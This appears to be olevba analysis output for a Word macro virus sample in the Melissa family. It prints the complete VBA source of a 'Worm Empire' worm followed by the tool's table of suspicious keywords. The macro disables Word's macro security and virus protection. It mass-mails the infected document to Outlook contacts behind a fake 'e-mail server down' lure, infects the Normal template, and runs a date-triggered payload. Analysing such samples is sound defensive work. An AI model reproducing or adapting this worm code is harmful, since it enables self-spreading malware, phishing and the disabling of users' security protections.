olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.ap-e27b9cf65ba18c88acd9fc6aa8212a4df5f82dd5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Worm_Empire.cls 
in file: Virus.MSWord.Melissa.ap-e27b9cf65ba18c88acd9fc6aa8212a4df5f82dd5 - OLE stream: 'Macros/VBA/Worm_Empire'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = False: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False
End If
Dim OLook, APIName, ABook, Off, Y As Integer, X As Integer, Z As Integer
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Security", "ActiveWorm") <> "Worm Empire" Then
    Set OLook = CreateObject("Outlook.Application"): Set APIName = OLook.GetNameSpace("MAPI")
    If OLook = "Outlook" Then
        APIName.Logon "profile", "password"
        For X = 1 To APIName.AddressLists.Count
            Set ABook = APIName.AddressLists(X): Set Off = OLook.CreateItem(0)
            For Y = 1 To ABook.AddressEntries.Count
                Off.Recipients.Add ABook.AddressEntries(Y): If Y > 50 Then Exit For
            Next Y
            Off.Subject = "Extremely URGENT: To All E-Mail User - " & Date
            Off.Body = "This announcement is for all E-MAIL user. Please take note that our E-Mail Server will down and we recommended you to read the document which attached with this E-Mail."
            Off.Attachments.Add ActiveDocument.FullName: Off.Send
        Next X
        APIName.Logoff
    End If
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Security", "ActiveWorm") = "Worm Empire"
End If
Dim AT, NT, AL As Long, NL As Long, CL As Long
Set AT = ActiveDocument.VBProject.VBComponents.Item(1): Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
AL = AT.CodeModule.CountOfLines: NL = NT.CodeModule.CountOfLines
If NT.Name <> "Worm_Empire" Then
    If NL > 0 Then NT.CodeModule.DeleteLines 1, NL
    NT.CodeModule.AddFromString "Private Sub Document_Close()"
    For CL = 2 To AL
        NT.CodeModule.InsertLines CL, AT.CodeModule.Lines(CL, 1)
    Next CL
    NT.Name = "Worm_Empire"
    If ActiveDocument.ReadOnly = False Then
        ActiveDocument.SaveAs ActiveDocument.FullName
    Else
        ActiveDocument.Saved = True
    End If
End If
If AT.Name <> "Worm_Empire" Then
    If AL > 0 Then AT.CodeModule.DeleteLines 1, AL
    AT.CodeModule.AddFromString "Private Sub Document_Open()"
    For CL = 2 To NL
        AT.CodeModule.InsertLines CL, NT.CodeModule.Lines(CL, 1)
    Next CL
    AT.Name = "Worm_Empire"
    If ActiveDocument.ReadOnly = False Then
        ActiveDocument.SaveAs ActiveDocument.FullName
    Else
        ActiveDocument.Saved = True
    End If
End If
If Day(Date) = 10 And Hour(Time) = 10 Then
    For CL = 1 To 5
        ActiveDocument.SaveAs Day(Date) & Month(Date) & Year(Date) & Second(Time) & CL
    Next CL
    With Selection
        .GoTo wdGoToLine, wdGoToAbsolute, 1
        .Font.Size = 40
        .Font.Underline = wdUnderlineWords
        .Font.Italic = True
        .TypeText "Worm! Let's We Enjoy." & Chr(10)
    End With
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

